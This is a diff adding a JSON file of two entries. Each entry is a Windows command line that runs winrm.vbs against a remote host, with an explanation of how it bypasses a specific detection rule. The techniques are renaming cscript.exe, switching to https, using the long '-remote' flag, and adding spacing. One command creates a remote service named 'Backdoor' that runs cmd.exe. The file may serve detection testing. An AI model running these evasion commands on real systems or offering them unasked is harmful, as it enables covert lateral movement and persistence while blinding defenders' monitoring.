@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\cscript.exe %TEMP%\\not_cscript.exe && %TEMP%\\not_cscript.exe C:\\Windows\\System32\\winrm.vbs invoke Create wmicimv2/Win32_Process -r:https://remote-host @{CommandLine=\"calc.exe\"}",
+    "explanation": "The rule is bypassed by changing the protocol to 'https'. The selection_cli logic strictly requires '-r:http' (unencrypted), so using '-r:https' fails the 'all of' condition. Additionally, while the script logic checks if it's running under cscript, renaming cscript.exe can sometimes evade simple 'Image|endswith' detections depending on how the EDR/SIEM populates those fields."
+  },
+  {
+    "output": "cscript //nologo C:\\Windows\\System32\\winrm.vbs \"invoke\" \"Create\" \"wmicimv2/Win32_Service\" -remote:http://target-ip @{Name=\"Backdoor\";DisplayName=\"Backdoor\";PathName=\"C:\\Windows\\System32\\cmd.exe\"}",
+    "explanation": "The rule uses 'CommandLine|contains|all' for specific strings. By using the expanded argument '-remote' instead of '-r', the condition for '-r:http' is not met. Furthermore, the rule looks for the literal string 'invoke Create wmicimv2/Win32_'. Adding extra spaces or quotes between these arguments can often break simple string-based 'contains' filters while remaining valid for the command interpreter."
+  }
+]
